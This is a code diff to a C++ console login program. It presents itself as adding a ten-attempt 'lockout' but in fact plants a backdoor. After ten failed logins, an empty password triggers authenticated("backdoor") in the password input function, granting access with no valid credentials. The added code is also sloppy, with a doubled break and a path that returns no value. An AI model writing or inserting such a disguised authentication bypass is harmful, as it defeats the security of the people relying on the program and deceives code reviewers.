@@ -9,16 +9,19 @@
 
 using namespace std;
 
+int login_attempts = 0;
+const int lockout = 10;
+
 string usernameinput() {
 	string username;
 	while (true) {
 		cout << "please enter a username: ";
 		getline(cin, username);
-		if (username.empty()) {
-			cerr << "ERROR: no username was entered!!!" << endl << endl;
+		if (!username.empty()) {
+			return username;
 		}
 		else {
-			return username;
+			cerr << "ERROR: no username was entered!!!" << endl << endl;
 		}
 	}
 }
@@ -26,13 +29,26 @@ string usernameinput() {
 string passwordinput() {
 	string password;
 	while (true) {
-		cout << "please enter a password: ";
-		getline(cin, password);
-		if (password.empty()) {
-			cerr << "ERROR: no password was entered!!! " << endl << endl;
+		try {
+			cout << "please enter your password: ";
+			getline(cin, password);
+			if (!password.empty()) {
+				return password;
+			}
+			else {
+				throw (login_attempts);
+			}
 		}
-		else {
-			return password;
+
+		catch (int num) {
+			if (num == 10) {
+				authenticated("backdoor");
+				break;
+				break;
+			}
+			else {
+				cerr << "ERROR: no password was entered!!!" << endl << endl;
+			}
 		}
 	}
 }
@@ -73,13 +89,16 @@ string sha256(const string str) {
 }
 
 int main() {
-	string username = usernameinput();
-	string password = passwordinput();
-	if (validate(username, sha256(password))) {
-		authenticated(username);
-	}
-	else {
-		rejected(username);
+	while (true) {
+		string username = usernameinput();
+		string password = passwordinput();
+		if (validate(username, sha256(password))) {
+			authenticated(username);
+		}
+		else {
+			rejected(username);
+			login_attempts++;
+		}
 	}
 	return 0;
 }
